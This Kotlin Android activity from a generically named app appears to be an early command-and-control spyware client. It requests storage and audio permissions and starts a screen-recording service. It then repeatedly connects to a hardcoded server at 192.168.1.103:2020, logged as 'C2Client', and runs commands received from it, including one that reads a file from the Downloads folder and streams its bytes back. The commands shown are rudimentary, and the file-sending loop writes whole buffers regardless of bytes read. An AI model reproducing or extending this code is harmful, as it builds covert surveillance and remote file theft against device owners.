package com.example.application

import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Environment
import android.provider.ContactsContract.Directory
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Button
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.ActivityResultCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.example.application.services.ScreenRecordingService
import java.io.BufferedReader
import java.io.File
import java.io.InputStream
import java.io.InputStreamReader
import java.io.OutputStream
import java.io.OutputStreamWriter
import java.io.PrintWriter
import java.net.Socket
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    private val TAG = "MainActivity"

    private val serverIp = "192.168.1.103"
    private val serverPort = 2020
    private var outputStream: OutputStream? = null
    private var inputStream: InputStream? = null
    private var output: PrintWriter? = null
    private var input: BufferedReader? = null

    private val registerForActivity = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions(), ActivityResultCallback {
        val hasAllPermissionsGranted = it.all { it.value }
        if (hasAllPermissionsGranted) {
            Log.d(TAG, "permission: granted")
            val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startScreenCapture(mediaProjectionManager)
        }else{
            Log.d(TAG, "permission: not granted")
        }
    })

    private val screenCaptureLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == RESULT_OK) {
            val data = result.data
            val serviceIntent = Intent(this, ScreenRecordingService::class.java).apply {
                putExtra("resultCode", result.resultCode)
                putExtra("data", data)
            }
            startService(serviceIntent)
        }
    }

    private fun startScreenCapture(mediaProjectionManager: MediaProjectionManager) {
        val intent = mediaProjectionManager.createScreenCaptureIntent()
        screenCaptureLauncher.launch(intent)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        registerForActivity.launch(
            listOf(
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.RECORD_AUDIO,
            ).toTypedArray()
        )


        thread {
            while(true) {
                listenForCommands()
            }
        }
    }

    fun stopRecording(view: View){
        (view as Button).setText("Finished :D")
        stopService(Intent(this, ScreenRecordingService::class.java))
    }


    private fun listenForCommands() {
        try {
            val socket = Socket(serverIp, serverPort)
            Log.d("C2Client", "Connected to server: $serverIp:$serverPort")
            outputStream = socket.getOutputStream()
            input = BufferedReader(InputStreamReader(socket.getInputStream()))
            output = PrintWriter(OutputStreamWriter(outputStream), true)

            while (true) {
                // Read the command from the server
                val command = input!!.readLine() ?: break
                Log.d("C2Client", "Received command: $command")

                // Execute the command and get the result
                executeCommand(command)
            }

            socket.close()
        } catch (e: Exception) {
            Log.e("C2Client", "Error: ${e.message}")
            Thread.sleep(5000)
        }
    }

    private fun executeCommand(command: String) {
        when {
            command == "ping" -> {
                output!!.println("pong")
            }
            command == "hello" -> {
                output!!.println("Hello from the client")
            }
            command.contains("file") -> {
                val file = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "hello.txt")
                if (!file.exists()) file.createNewFile()
                file.writeText("Hi file")
                val bytes = ByteArray(1024)
                var bytesRead: Int
                file.inputStream().use { fis ->
                    while (fis.read(bytes).also { bytesRead = it } != -1) {
                        Log.d(TAG, "executeCommand: ")
                        outputStream!!.write(bytes)
                    }
                }
            }
            else -> {
                print("Unknown command")
            }
        }
    }
}